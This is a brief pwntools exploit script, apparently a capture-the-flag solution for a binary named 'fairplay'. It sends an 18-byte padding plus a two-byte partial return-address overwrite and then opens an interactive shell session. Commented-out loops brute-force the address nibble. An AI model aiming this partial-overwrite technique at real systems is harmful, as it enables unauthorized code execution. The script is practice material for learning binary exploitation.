from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())

exe = './fairplay'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# for i in range(0xf):
#     addr = f'0x{i}170'
#     value = int(addr, 16)
#     payload = b'B'*18+p16(value)
#     io.sendafter(b'worthy?', payload)
#     if b'\nAre you' in io.recvall():
#         solve()
#     else:
#         io.close()

# for i in range(10):
#     io.sendafter(b'worthy?', b'B'*18+p16(0x9170))

io.sendafter(b'worthy?', b'B'*18+p16(0x9170))

io.interactive()